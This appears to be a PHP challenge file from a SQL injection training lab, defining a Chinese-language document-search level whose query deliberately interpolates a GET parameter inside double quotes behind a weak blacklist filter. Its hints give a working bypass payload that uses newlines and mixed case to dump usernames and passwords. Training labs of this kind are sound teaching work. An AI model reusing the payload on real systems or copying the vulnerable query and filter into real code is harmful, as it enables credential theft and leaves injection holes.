<?php
// Less-27a 公文检索（双引号）
if (!defined('SQLI_MALL')) { die('forbidden'); }
return [
  'title' => '公文检索（双引号）',
  'desc'  => '按关键词检索公文库（移动端）。',
  'method' => 'GET',
  'form' => ['method' => 'GET', 'fields' => array (
  'id' => '检索词',
), 'submit' => '查 询'],
  'difficulty' => 5,
  'task' => '双引号闭合 + union/select 过滤 + 无报错，绕过后联合取数',
  'hints' => array (
  0 => '先确定闭合字符——这次不是单引号。',
  1 => '双引号闭合 + 大小写混合双写 + %0a 替代空格。',
  2 => '示例：?id=-1"%0auniOn%0aSelEct%0a1,group_concat(username,0x3a,password),3%0afrom%0aoa_employee',
),
  'run' => function ($app) {
    if (!isset($_GET['id'])) return $app->info('请输入检索词。');
    $id = $_GET['id'];
    $id = preg_replace('/[\\/\\*]/', '', $id);
    $id = preg_replace('/[--]/', '', $id);
    $id = preg_replace('/[#]/', '', $id);
    $id = preg_replace('/[ +]/', '', $id);
    $id = preg_replace('/select/m', '', $id);
    $id = preg_replace('/union/s', '', $id);
    $id = preg_replace('/UNION/s', '', $id);
    $id = preg_replace('/SELECT/s', '', $id);
    $id = preg_replace('/Union/s', '', $id);
    $id = preg_replace('/Select/s', '', $id);
    $sql = "SELECT id, title, content FROM oa_notice WHERE id=\"{$id}\" LIMIT 0,1";
    $res = $app->q($sql);
    $row = $app->fetch($res);
    if ($row) {
    return $app->card(['公文标题' => $row['title'], '正文内容' => $row['content']]);
    }
    return $app->info('');
  },
];
